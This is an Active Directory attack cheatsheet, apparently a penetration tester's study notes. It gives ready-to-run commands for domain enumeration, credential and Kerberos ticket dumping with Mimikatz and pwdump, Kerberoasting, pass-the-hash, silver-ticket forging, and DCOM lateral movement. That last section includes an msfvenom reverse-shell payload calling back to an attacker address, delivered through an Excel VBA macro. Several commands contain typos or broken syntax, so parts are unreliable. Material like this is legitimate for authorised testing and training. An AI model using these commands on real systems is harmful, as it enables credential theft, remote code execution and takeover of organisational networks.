# Active Directory Cheatsheet

### [AD Enumeration](#AD-Enumeration) 

### [AD Authentication](#AD-Authentication)  

### [AD Lateral Movement](#AD-Lateral-Movement) 

### [AD Persistence](#AD-Persistence)  


## AD Introduction

Goal:
1. Perform user hunting to track down where users are logged into in the network - find users that are members of high-value groups.
2. Dump credentials and/or obtain Kerberos tickets.
3. Gain access to the user's machine using creds/ticket.
4. (Possibly) escalate privileges in the machine.
5. Repeat steps above until you have administrative privileges in the Domain Controller.

## AD Enumeration

### Enumeration - Manual

Enum users/groups/computers
* Look for users with high-privs across the domain e.g. Domain Admins or Derivative Local Admins
* Look for custom groups.
```
# get all users in the domain
cmd> net user /domain
cmd> net user [username] /domain

# get all groups in the domain
cmd> net group /domain
cmd> net group [groupname] /domain

# get all computers in the domain
cmd> net computer /domain
cmd> net computer \\[computername] /domain
```

Enum Domain Controller hostname (PdcRoleOwner)
```
PS> [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
```

Enum via. Service Principal Names (Service Accounts)
* SPNs are unique service instance identifiers, used to associate a service on a server to a service account in Active Directory.
* Enum SPNs to obtain the IP address and port number of apps running on servers integrated with Active Directory.
* Query the Domain Controller in search of SPNs.

```
# Example: search by web server (http) (see automated script below)
$Searcher.filter="serviceprincipalname=*http*"

----OUTPUT----
serviceprincipalname     {HTTP/CorpWebServer.corp.com}
----OUTPUT----

# resolve the hostname
$ nslookup corpwebserver.corp.com
Server: UnKnown
Address: 192.168.1.110

Name: corpwebserver.corp.com
Address: 192.168.1.110
```


### Enumeration - Automated

PowerView.ps1
* https://book.hacktricks.xyz/windows/basic-powershell-for-pentesters/powerview
```
# import module
PS> Import-Module .\PowerView.ps1

# enum logged-in users on target computer
PS> Get-NetLoggedon -ComputerName [computer_name]

# enum active user sessions, targeting computer/DC
PS> Get-NetSession -ComputerName [domain_controller]
```

PowerShell automated users/groups/computers and SPN enum
```
# build the LDAP path
$domainObj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
$PDC = ($domainObj.PdcRoleOwner).Name
$SearchString = "LDAP://"
$SearchString += $PDC + "/"
$DistinguishedName = "DC=$($domainObj.Name.Replace('.', ',DC='))"
$SearchString += $DistinguishedName

# instantiate DirectorySearcher class with LDAP provider path.
$Searcher = New-Object System.DirectoryServices.DirectorySearcher([ADSI]$SearchString)
$objDomain = New-Object System.DirectoryServices.DirectoryEntry($SearchString, "[domain_name]\[user]","[password]")
$Searcher.SearchRoot = $objDomain

# ###########################
# UNCOMMENT FILTERS AS NEEDED
# ###########################

# filter by Domain Admin users
$Searcher.filter="memberof=CN=Domain Admins,CN=Users,DC=corp,DC=com"

# filter by all Users in domain
# $Searcher.filter="samAccountType=805306368"

# filter by all Groups in domain
# $Searcher.filter="objectcategory=group"

# filter by all Computers in domain
# $Searcher.filter="objectcategory=computer"

# filter by all Computers AND operating sys is Windows 10
# $Searcher.filter="(&(objectcategory=computer)(operatingsystem=*Windows 10*))"

# filter by SPN
$Searcher.filter="serviceprincipalname=*http*"

# invoke
$Result = $Searcher.FindAll()

# print each object and its properties
Foreach($obj in $Result) {
        Foreach($prop in $obj.Properties){$prop}
        Write-Host "------------------------"
}
```

## AD Authentication

### NTLM ###

NTLM authentication uses a challenge-response model, where a nonce/challenge encrypted using the user's NTLM hash is validated by the Domain Controller.

Dumping LM/NTLM hashes with Mimikatz
```
# Open mimikatz and escalate security token to SYSTEM integrity
cmd> mimikatz.exe
mimikatz > privilege::debug
mimikatz > token::elevate

# Dump creds of all logged-on users using the Securlsa module
mimikatz > securlsa::logonpasswords

# Dump Ticket Granting Ticket and Ticket Granting Service (kerberos tickets)
# -> Access resources associated with these tickets OR
# -> Obtain TGS with a TGT to access specific resources we want to target in the domain.
mimkatz > seccurlsa::tickets

# Dump contents of SAM database in current host
mimikatz > lsadump::sam

# Dump contents of ???
mimikatz > lsadump::dcsync /domain:pentestlab.local /all
```

Other tools
```
# pwdump
cmd> pwdump.exe localhost

# fgdump (improved pwdump, shutdown firewalls)
cmd> fgdump.exe localhost

# all domain hashes in NTDS.dit file on the Domain Controller
cmd> type C:\Windows\NTDS\NTDS.dit
```

### Kerberos ####

Kerberos authentication uses a ticketing system, where a Ticket Granting Ticket (TGT) is issued by the Domain Controller (with the role of Key Distribution Center (KDC)) and is used to request tickets from the Ticket Granting Service (TGS) for access to resources/systems joined to the domain.
* Hashes are stored in the Local Security Authority Subsystem Service (LSASS).
* LSASS process runs as SYSTEM, so we need SYSTEM / local admin to dump hashes stored on target.

Dumping hashes or Kerberos TGT/TGS tickets with Mimikatz
```
# escalate security token to SYSTEM integrity
cmd> mimikatz.exe
mimikatz > privilege::debug
mimikatz > token::elevate

# dump creds of all logged-on users using Securlsa module
mimikatz > securlsa::logonpasswords

# dump TGT and TGS tickets
# -> access resources associated with the tickets
# -> exchange TGS with TGT to access resources we want to target in domain
mimikatz > securlsa::tickets

# dump contents of SAM db in current host
mimikatz > lsadump::sam
```

Service account attacks
* If we know the `serviceprincipalname` value from prior AD enum, we can target the SPN by by requesting a service ticket for it from the Domain Controller and access resources from the service with our own ticket.
```
# load the System.IdentityModel namespace
PS> Add-Type -AssemblyName System.IdentityModel

# request the Service Ticket
PS> New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList '[service_principal_name]'

# list cached Kerberos tickets for the current user
PS> klist

# download/export cached tickets
mimikatz > kerberos::list /export
```

Crack SPN password hash with Kerberoast
```
# locally crack hashes
$ python tgsrepcrack.py wordlist [/path/to/exported/tickets]

# crack hashes on target
PS> Invoke-Kerberoast.ps1
```


## AD Lateral Movement

Pass-the-Hash
* Requires SMB connection through the firewall
* Requires Windows File and Print Sharing feature to be enabled.
* Requires local admin permissions, as connection is made using the `Admin$` share.
```
$ pth-winexe -U [username]%[password_hash] //[target] [command_to_exec]
$ pth-winexe -U Administrator%NTLMhash //10.1.1.1 cmd
```

Overpass-the-Hash
* "over" abuse a NTLM hash to gain a full Kerberos TGT or Service Ticket.
```
# obtain NTLM hash
mimikatz > sekurlsa::logonpasswords

# turn hash into a Kerberos ticket
mimikatz > sekurlsa::pth /user:[user_name] /domain:[domain_name] /ntlm:[hash_value] /run:PowerShell.exe

# generate a TGT by authenticating to a network share on the Domain Controller
PS> net use \\dc01

# view requested TGT/TGS Kerberos tickets
PS> klist

# code exec via. PsExec on the Domain Controller
PS> .\PsExec.exe \\dc01 cmd.exe
```

Pass the Ticket
* Takes advantage of the TGS, by forging our own Service Ticket to access the target resource (service account) with any permissions.
* Does NOT require admin privs if Service Tickets belong to current user.
```
# obtain SID of domain (remove RID -XXXX) at the end of the user SID string.
cmd> whoami /user
corp\offsec S-1-5-21-1602875587-2787523311-2599479668[-1103]

# generate the Silver Ticket and inject it into memory
mimikatz > kerberos::golden /user:[user_name] /domain:[domain_name] /sid:[sid_value] /target:[service_hostname] /service:[service_type] /rc4:[hash] /ppt
```

Distributed Component Object Model (DCOM)
* DCOM allows a computer to run programs over the network on a different computer e.g. Excel/PowerPoint/Outlook
* Requires RPC port 135 and local admin access to call the DCOM Service Control Manager - the API.
* The `run` method within DCOM allows us to execute a VBA macro remotely.

DCOM - create payload and VBA macro
```
# (kali) create rshell payload
$ msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.111 LPORT=4444 -f hta-psh -o evil.hta

# (python) split payload into smaller chunks starting with "powershell.exe -nop -w hidden -e
str = "powershell.exe -nop -w hidden -e {base64_encoded_payload}"
n = 50
for i in range(0, len(str), n):
print "Str = Str + " + '"' + str[i:i+n] + '"'

# create VBA macro -> insert into Excel file
Sub MyMacro()
        Dim Str As String
        {insert_payload_here}
        Shell (Str)
End Sub
```

DCOM - Copy file to remote and execute
```
# create instance of Excel.Application object
$com [activator]::CreateInstance([type]::GetTypeFromProgId("Excel.Application", "[target_workstation]"))

# copy Excel file containing VBA payload to target
$LocalPath = "C:\Users\[user]\badexcel.xls
$RemotePath = "\\[target]\c$\badexcel.xls
[System.IO.File]::Copy($LocalPath, $RemotePath, $True)

# create a SYSTEM profile - required as part of the opening process
$path = "\\[target]\c$\Windows\sysWOW64\config\systemprofile\Desktop"
$temp = [system.io.directory]::createDirectory($Path)

# open Excel file and execute macro
$Workbook = $com.Workbooks.Open("C:\myexcel.xls")
$com.Run("mymacro")
```


## AD Persistence


